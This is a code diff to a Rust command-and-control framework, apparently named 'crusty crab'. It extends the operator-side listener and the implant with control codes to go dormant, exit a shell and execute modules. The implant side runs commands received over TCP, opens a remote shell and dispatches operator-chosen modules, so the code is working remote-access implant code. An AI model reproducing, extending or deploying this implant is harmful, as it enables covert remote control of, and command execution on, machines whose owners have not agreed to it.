@@ -167,14 +167,14 @@ fn listen_udp(lsn: &mut Listener, address: SocketAddr, sb: &mut Arc<Mutex<Shared
 // Control Codes:
 //
 // 69 => exit shell (if in one)
+// 101 => return to dormant but still connected (return to main crusty crab)
 // 3 => terminate connection with implant and revert back to listening mode
 // 4 => Send a single command for the implant to execute
 // 5 => Start up a shell
 // 6 => Have the implant execute a module
 // anything else => do nothing (sleep for 10 ms to allow client to unlock shared buffer)
 fn interact_udp(lsn: &mut Listener, target: SocketAddr, sb: &mut Arc<Mutex<SharedBuffer>>) {
-    let id = lsn.id + 1;
-    print!("\n[+] Connection established by listener {}\n", id);
+    print!("\n[+] Connection established by listener {}\n", lsn.id + 1);
     let mut is_interacting: bool = false;
     // memo keeps track of the last String contained within the shared buffer
     // used so that listener can check to see if shared buffer has been read from or written to by client
@@ -315,9 +315,17 @@ fn interact_udp(lsn: &mut Listener, target: SocketAddr, sb: &mut Arc<Mutex<Share
         }
     }
 }
-
+// Control Codes:
+//
+// 69 => exit shell (if in one)
+// 101 => return to dormant but still connected (return to main crusty crab)
+// 3 => terminate connection with implant and revert back to listening mode
+// 4 => Send a single command for the implant to execute
+// 5 => Start up a shell
+// 6 => Have the implant execute a module
+// anything else => do nothing (sleep for 10 ms to allow client to unlock shared buffer)
 fn interact_tcp(lsn: &mut Listener, stream: &mut TcpStream, sb: &mut Arc<Mutex<SharedBuffer>>) {
-    println!("[+] Connection established by listener {}", lsn.id);
+    println!("\n[+] Connection established by listener {}", lsn.id + 1);
     let mut is_interacting: bool = false;
     let mut memo: String = String::new();
     loop {
@@ -325,10 +333,15 @@ fn interact_tcp(lsn: &mut Listener, stream: &mut TcpStream, sb: &mut Arc<Mutex<S
         if is_interacting {
             // checks if client is terminating interaction with target_src
             let cc: u8 = rcv_client_command(lsn, sb);
-            if cc == 6 {
+            if cc == 69 {
                 is_interacting = false;
                 let code: u8 = 69;
                 let bytes = stream.write(&[code; 1]).unwrap();
+            }
+            else if cc == 101 {
+                let code: u8 = 4;
+                let bytes = stream.write(&[code; 1]).unwrap();
+                is_interacting = false;
             }
             // otherwise interact normally
             else {
@@ -405,6 +418,32 @@ fn interact_tcp(lsn: &mut Listener, stream: &mut TcpStream, sb: &mut Arc<Mutex<S
                     let code: u8 = 2;
                     stream.write(&[code; 1]).unwrap();
                 },
+                //tell implant to execute module
+                6 => {
+                    let mut flag: bool = true;
+                    while flag {
+                        let mut sb_copy = sb.lock().unwrap();
+                        if !vec_is_zero(&sb_copy.buff) {
+                            let code: u8 = 3;
+                            stream.write(&[code; 1]).unwrap();
+                            stream.write(&sb_copy.buff).unwrap();
+                            let mut bytes = 0;
+                            let mut output = [0; 32768];
+                            while bytes == 0 {
+                                output = [0; 32768];
+                                bytes = match stream.read(&mut output) {
+                                        Ok(b) => b,
+                                        Err(e) => 0,
+                                };
+                            }
+                            sb_copy.buff = output.to_vec();
+                            flag = false;
+                        }
+                        else {
+                            thread::sleep(Duration::from_millis(10));
+                        }
+                    }
+                }
                 _u8 => {
                     thread::sleep(Duration::from_millis(10));
                 }
@@ -551,6 +590,11 @@ pub fn tcp_shell(stream: &mut TcpStream) {
         //Changed to include 1 because there was a bunch
         //being sent that didnt have anything
         let mut cmd = String::from_utf8_lossy(&buffer[..]).to_string();
+        if cmd.contains("exit") || cmd.contains("Exit"){
+            let cmd_out = "Exiting Shell";
+            stream.write(cmd_out.as_bytes()).unwrap();
+            break;
+        }
         let cmd_out = execute_cmd(cmd);
         stream.write(cmd_out.as_bytes()).unwrap();
     }
@@ -730,6 +774,19 @@ fn imp_tcp(address: SocketAddr) {
                 },
                 // begin shell mode
                 2 => tcp_shell(&mut sock),
+                3 => {
+                    buffer = [0; 32768];
+                    let bytes = match sock.read(&mut buffer) {
+                        Ok(b) => (b),
+                        Err(e) => 0,
+                    };
+                    if bytes != 0 {
+                        let mod_res = usr_mods::dispatch(String::from_utf8_lossy(&buffer[..]).as_ref().to_string());
+                        sock.write(&mod_res);
+                    }
+                },
+                //Do nothing
+                4 => {},
                 _u8 => todo!(),
             }
         }
